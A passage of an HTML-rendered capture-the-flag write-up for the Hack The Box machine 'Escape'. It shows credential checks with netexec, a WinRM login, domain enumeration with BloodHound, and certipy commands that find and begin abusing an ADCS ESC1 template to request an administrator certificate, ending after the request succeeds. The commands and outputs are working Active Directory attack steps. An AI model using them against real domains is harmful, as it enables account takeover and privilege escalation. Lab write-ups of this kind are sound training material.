+</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ldap<span class="w"> </span>port<span class="w"> </span><span class="m">389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">389</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>ldap<span class="w"> </span>with<span class="w"> </span>netexec
+</span><span id="__span-34-13"><a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:sequel.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span><span id="__span-34-14"><a id="__codelineno-34-14" name="__codelineno-34-14" href="#__codelineno-34-14"></a>LDAPS<span class="w">       </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">636</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>sequel.htb<span class="se">\R</span>yan.Cooper:NuclearMosquito3<span class="w"> </span>
+</span><span id="__span-34-15"><a id="__codelineno-34-15" name="__codelineno-34-15" href="#__codelineno-34-15"></a>
+</span><span id="__span-34-16"><a id="__codelineno-34-16" name="__codelineno-34-16" href="#__codelineno-34-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>rdp<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-34-17"><a id="__codelineno-34-17" name="__codelineno-34-17" href="#__codelineno-34-17"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>rdp<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>closed
+</span><span id="__span-34-18"><a id="__codelineno-34-18" name="__codelineno-34-18" href="#__codelineno-34-18"></a>
+</span><span id="__span-34-19"><a id="__codelineno-34-19" name="__codelineno-34-19" href="#__codelineno-34-19"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>wmi<span class="w"> </span>port<span class="w"> </span><span class="m">135</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-34-20"><a id="__codelineno-34-20" name="__codelineno-34-20" href="#__codelineno-34-20"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>wmi<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">135</span><span class="w"> </span>is<span class="w"> </span>closed
+</span><span id="__span-34-21"><a id="__codelineno-34-21" name="__codelineno-34-21" href="#__codelineno-34-21"></a>
+</span><span id="__span-34-22"><a id="__codelineno-34-22" name="__codelineno-34-22" href="#__codelineno-34-22"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>nfs<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-34-23"><a id="__codelineno-34-23" name="__codelineno-34-23" href="#__codelineno-34-23"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>nfs<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>closed
+</span><span id="__span-34-24"><a id="__codelineno-34-24" name="__codelineno-34-24" href="#__codelineno-34-24"></a>
+</span><span id="__span-34-25"><a id="__codelineno-34-25" name="__codelineno-34-25" href="#__codelineno-34-25"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ssh<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-34-26"><a id="__codelineno-34-26" name="__codelineno-34-26" href="#__codelineno-34-26"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ssh<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>closed
+</span><span id="__span-34-27"><a id="__codelineno-34-27" name="__codelineno-34-27" href="#__codelineno-34-27"></a>
+</span><span id="__span-34-28"><a id="__codelineno-34-28" name="__codelineno-34-28" href="#__codelineno-34-28"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>vnc<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-34-29"><a id="__codelineno-34-29" name="__codelineno-34-29" href="#__codelineno-34-29"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>vnc<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>closed
+</span><span id="__span-34-30"><a id="__codelineno-34-30" name="__codelineno-34-30" href="#__codelineno-34-30"></a>
+</span><span id="__span-34-31"><a id="__codelineno-34-31" name="__codelineno-34-31" href="#__codelineno-34-31"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ftp<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-34-32"><a id="__codelineno-34-32" name="__codelineno-34-32" href="#__codelineno-34-32"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ftp<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>closed
+</span><span id="__span-34-33"><a id="__codelineno-34-33" name="__codelineno-34-33" href="#__codelineno-34-33"></a>
+</span><span id="__span-34-34"><a id="__codelineno-34-34" name="__codelineno-34-34" href="#__codelineno-34-34"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>mssql<span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>sequel.htb...
+</span><span id="__span-34-35"><a id="__codelineno-34-35" name="__codelineno-34-35" href="#__codelineno-34-35"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>mssql<span class="w"> </span>with<span class="w"> </span>netexec
+</span><span id="__span-34-36"><a id="__codelineno-34-36" name="__codelineno-34-36" href="#__codelineno-34-36"></a>MSSQL<span class="w">       </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">1433</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:sequel.htb<span class="o">)</span>
+</span><span id="__span-34-37"><a id="__codelineno-34-37" name="__codelineno-34-37" href="#__codelineno-34-37"></a>MSSQL<span class="w">       </span><span class="m">10</span>.129.228.253<span class="w">  </span><span class="m">1433</span><span class="w">   </span>DC<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>sequel.htb<span class="se">\R</span>yan.Cooper:NuclearMosquito3
+</span></code></pre></div>
+<p>great! it appears ryan can login to <code>winrm</code> with those creds</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>sequel.htb<span class="w"> </span>-u<span class="w"> </span>ryan.cooper<span class="w"> </span>-p<span class="w"> </span>NuclearMosquito3
+</span></code></pre></div>
+<p>grabbed user flag! <code>c139f30e7a999df9e9d0cb0887b679eb</code></p>
+<p>proof:</p>
+<p><img alt="image.png" src="../MediaFiles/escape_image4.png" /></p>
+<hr />
+<h1 id="privesc">Privesc</h1>
+<p>Folder structure:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper&gt;<span class="w"> </span>tree<span class="w"> </span>/f<span class="w"> </span>/a
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>Folder<span class="w"> </span>PATH<span class="w"> </span>listing
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>Volume<span class="w"> </span>serial<span class="w"> </span>number<span class="w"> </span>is<span class="w"> </span>EB33-4140
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>C:.
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>+---3D<span class="w"> </span>Objects
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>+---Contacts
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>+---Desktop
+</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a><span class="p">|</span><span class="w">       </span>user.txt
+</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a><span class="p">|</span>
+</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a>+---Documents
+</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a>+---Downloads
+</span><span id="__span-36-12"><a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a>+---Favorites
+</span><span id="__span-36-13"><a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a><span class="p">|</span><span class="w">   </span><span class="p">|</span><span class="w">   </span>Bing.url
+</span><span id="__span-36-14"><a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a><span class="p">|</span><span class="w">   </span><span class="p">|</span>
+</span><span id="__span-36-15"><a id="__codelineno-36-15" name="__codelineno-36-15" href="#__codelineno-36-15"></a><span class="p">|</span><span class="w">   </span><span class="se">\-</span>--Links
+</span><span id="__span-36-16"><a id="__codelineno-36-16" name="__codelineno-36-16" href="#__codelineno-36-16"></a>+---Links
+</span><span id="__span-36-17"><a id="__codelineno-36-17" name="__codelineno-36-17" href="#__codelineno-36-17"></a><span class="p">|</span><span class="w">       </span>Desktop.lnk
+</span><span id="__span-36-18"><a id="__codelineno-36-18" name="__codelineno-36-18" href="#__codelineno-36-18"></a><span class="p">|</span><span class="w">       </span>Downloads.lnk
+</span><span id="__span-36-19"><a id="__codelineno-36-19" name="__codelineno-36-19" href="#__codelineno-36-19"></a><span class="p">|</span>
+</span><span id="__span-36-20"><a id="__codelineno-36-20" name="__codelineno-36-20" href="#__codelineno-36-20"></a>+---Music
+</span><span id="__span-36-21"><a id="__codelineno-36-21" name="__codelineno-36-21" href="#__codelineno-36-21"></a>+---Pictures
+</span><span id="__span-36-22"><a id="__codelineno-36-22" name="__codelineno-36-22" href="#__codelineno-36-22"></a>+---Saved<span class="w"> </span>Games
+</span><span id="__span-36-23"><a id="__codelineno-36-23" name="__codelineno-36-23" href="#__codelineno-36-23"></a>+---Searches
+</span><span id="__span-36-24"><a id="__codelineno-36-24" name="__codelineno-36-24" href="#__codelineno-36-24"></a><span class="se">\-</span>--Videos
+</span></code></pre></div>
+<h2 id="find-domain-groups">Find domain groups:</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>net<span class="w"> </span>group<span class="w"> </span>/domain
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper&gt;<span class="w"> </span>net<span class="w"> </span>group<span class="w"> </span>/domain
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>Group<span class="w"> </span>Accounts<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="se">\\</span>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>-------------------------------------------------------------------------------
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>*Cloneable<span class="w"> </span>Domain<span class="w"> </span>Controllers
+</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a>*DnsUpdateProxy
+</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a>*Domain<span class="w"> </span>Admins
+</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a>*Domain<span class="w"> </span>Computers
+</span><span id="__span-38-10"><a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a>*Domain<span class="w"> </span>Controllers
+</span><span id="__span-38-11"><a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a>*Domain<span class="w"> </span>Guests
+</span><span id="__span-38-12"><a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a>*Domain<span class="w"> </span>Users
+</span><span id="__span-38-13"><a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a>*Enterprise<span class="w"> </span>Admins
+</span><span id="__span-38-14"><a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a>*Enterprise<span class="w"> </span>Key<span class="w"> </span>Admins
+</span><span id="__span-38-15"><a id="__codelineno-38-15" name="__codelineno-38-15" href="#__codelineno-38-15"></a>*Enterprise<span class="w"> </span>Read-only<span class="w"> </span>Domain<span class="w"> </span>Controllers
+</span><span id="__span-38-16"><a id="__codelineno-38-16" name="__codelineno-38-16" href="#__codelineno-38-16"></a>*Group<span class="w"> </span>Policy<span class="w"> </span>Creator<span class="w"> </span>Owners
+</span><span id="__span-38-17"><a id="__codelineno-38-17" name="__codelineno-38-17" href="#__codelineno-38-17"></a>*Key<span class="w"> </span>Admins
+</span><span id="__span-38-18"><a id="__codelineno-38-18" name="__codelineno-38-18" href="#__codelineno-38-18"></a>*Protected<span class="w"> </span>Users
+</span><span id="__span-38-19"><a id="__codelineno-38-19" name="__codelineno-38-19" href="#__codelineno-38-19"></a>*Read-only<span class="w"> </span>Domain<span class="w"> </span>Controllers
+</span><span id="__span-38-20"><a id="__codelineno-38-20" name="__codelineno-38-20" href="#__codelineno-38-20"></a>*Schema<span class="w"> </span>Admins
+</span></code></pre></div>
+<h2 id="current-users-group-membership">Current user’s Group membership</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>whoami<span class="w"> </span>/groups
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>GROUP<span class="w"> </span>INFORMATION
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>-----------------
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>Group<span class="w"> </span>Name<span class="w">                                  </span>Type<span class="w">             </span>SID<span class="w">          </span><span class="nv">Attributes</span>
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="o">===========================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">============</span><span class="w"> </span><span class="o">==================================================</span>
+</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a>Everyone<span class="w">                                    </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-1-0<span class="w">      </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a>BUILTIN<span class="se">\R</span>emote<span class="w"> </span>Management<span class="w"> </span>Users<span class="w">             </span>Alias<span class="w">            </span>S-1-5-32-580<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a>BUILTIN<span class="se">\U</span>sers<span class="w">                               </span>Alias<span class="w">            </span>S-1-5-32-545<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-40-9"><a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a>BUILTIN<span class="se">\P</span>re-Windows<span class="w"> </span><span class="m">2000</span><span class="w"> </span>Compatible<span class="w"> </span>Access<span class="w">  </span>Alias<span class="w">            </span>S-1-5-32-554<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-40-10"><a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a>BUILTIN<span class="se">\C</span>ertificate<span class="w"> </span>Service<span class="w"> </span>DCOM<span class="w"> </span>Access<span class="w">     </span>Alias<span class="w">            </span>S-1-5-32-574<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-40-11"><a id="__codelineno-40-11" name="__codelineno-40-11" href="#__codelineno-40-11"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\N</span>ETWORK<span class="w">                        </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-2<span class="w">      </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-40-12"><a id="__codelineno-40-12" name="__codelineno-40-12" href="#__codelineno-40-12"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\A</span>uthenticated<span class="w"> </span>Users<span class="w">            </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-11<span class="w">     </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-40-13"><a id="__codelineno-40-13" name="__codelineno-40-13" href="#__codelineno-40-13"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\T</span>his<span class="w"> </span>Organization<span class="w">              </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-15<span class="w">     </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-40-14"><a id="__codelineno-40-14" name="__codelineno-40-14" href="#__codelineno-40-14"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\N</span>TLM<span class="w"> </span>Authentication<span class="w">            </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-64-10<span class="w">  </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span></code></pre></div>
+<p>the one group i found interesting here was <code>BUILTIN\Certificate Service DCOM Access</code></p>
+<h2 id="current-users-privileges">Current user’s privileges:</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>whoami<span class="w"> </span>/priv
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>PRIVILEGES<span class="w"> </span>INFORMATION
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>----------------------
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>Privilege<span class="w"> </span>Name<span class="w">                </span>Description<span class="w">                    </span><span class="nv">State</span>
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">=======</span>
+</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>SeMachineAccountPrivilege<span class="w">     </span>Add<span class="w"> </span>workstations<span class="w"> </span>to<span class="w"> </span>domain<span class="w">     </span>Enabled
+</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a>SeChangeNotifyPrivilege<span class="w">       </span>Bypass<span class="w"> </span>traverse<span class="w"> </span>checking<span class="w">       </span>Enabled
+</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a>SeIncreaseWorkingSetPrivilege<span class="w"> </span>Increase<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>working<span class="w"> </span><span class="nb">set</span><span class="w"> </span>Enabled
+</span></code></pre></div>
+<p>Lets try running bloodhound first to get a better picture of the AD:</p>
+<h2 id="bloodhound-as-ryan">Bloodhound as ryan</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>bloodhound-python<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;ryan.cooper&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;NuclearMosquito3&#39;</span><span class="w"> </span>-d<span class="w"> </span>sequel.htb<span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.129.228.253<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>--zip
+</span></code></pre></div>
+<p>it was successful, lets dive in</p>
+<p><code>Ryan.Cooper</code> has no <code>OUTBOUND OBJECT CONTROL</code></p>
+<p><img alt="image.png" src="../MediaFiles/escape_image5.png" /></p>
+<p>and his <code>Group Membership</code> also provides nothing interesting</p>
+<p><img alt="image.png" src="../MediaFiles/escape_image6.png" /></p>
+<p>Since ryan has nothing further valuable here, we could inspect other objects:</p>
+<p>For example, we can view the <code>Domain Users</code>:</p>
+<p><img alt="image.png" src="../MediaFiles/escape_image7.png" /></p>
+<p>By greater inspection to all of them, found no obvious attack paths….</p>
+<p>Okay, lets take a break and think again, what do we already know about our user?</p>
+<p>For example, our user is member of <code>CERTIFICATE SERVICE DCOM ACCESS@SEQUEL.HTB</code> group, what does that mean? </p>
+<p>Well just by reading the name of this group it is obvious that certificates are involved, and since certificates are involved, this means that <code>Active Directory Certificate Service (AD CS)</code> exists.</p>
+<p>So why not try <code>enumerate AD CS</code>? lets try:</p>
+<h2 id="enumerate-adcs">Enumerate ADCS</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>certipy<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;Ryan.Cooper@sequel.htb&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;NuclearMosquito3&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.228.253<span class="w"> </span>-vulnerable<span class="w"> </span>-stdout
+</span></code></pre></div>
+<p>from the output, scroll down on the Vulnerabilities section:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Vulnerabilities
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="w">      </span>ESC1<span class="w">      </span>:<span class="w"> </span><span class="s1">&#39;SEQUEL.HTB\\Domain Users&#39;</span><span class="w"> </span>can<span class="w"> </span>enroll,<span class="w"> </span>enrollee<span class="w"> </span>supplies<span class="w"> </span>subject<span class="w"> </span>and<span class="w"> </span>template<span class="w"> </span>allows<span class="w"> </span>client<span class="w"> </span>authentication
+</span></code></pre></div>
+<p>nice!, it seems its vulnerable to <code>ESC1</code> ! this should be our attack path</p>
+<h2 id="abusing-esc1">Abusing ESC1</h2>
+<p>There are multiple ways to do this, one is described here (via certify and rubeus) <a href="https://bloodhound.specterops.io/resources/edges/adcs-esc1">https://bloodhound.specterops.io/resources/edges/adcs-esc1</a></p>
+<p>I preferred using certipy since i was more familiar with it:</p>
+<h3 id="1-request-pfx-certificate">1. Request pfx certificate</h3>
+<p>first lets sync with the DC</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>sudo<span class="w"> </span>ntpdate<span class="w"> </span>sequel.htb
+</span></code></pre></div>
+<p>then use certipy</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>certipy<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>ryan.cooper<span class="w"> </span>-p<span class="w"> </span>NuclearMosquito3<span class="w"> </span>-target<span class="w"> </span>sequel.htb<span class="w"> </span>-upn<span class="w"> </span>administrator@sequel.htb<span class="w"> </span>-ca<span class="w"> </span>sequel-dc-ca<span class="w"> </span>-template<span class="w"> </span>UserAuthentication
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>Certipy<span class="w"> </span>v4.8.2<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Requesting<span class="w"> </span>certificate<span class="w"> </span>via<span class="w"> </span>RPC
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>requested<span class="w"> </span>certificate
+</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Request<span class="w"> </span>ID<span class="w"> </span>is<span class="w"> </span><span class="m">14</span>
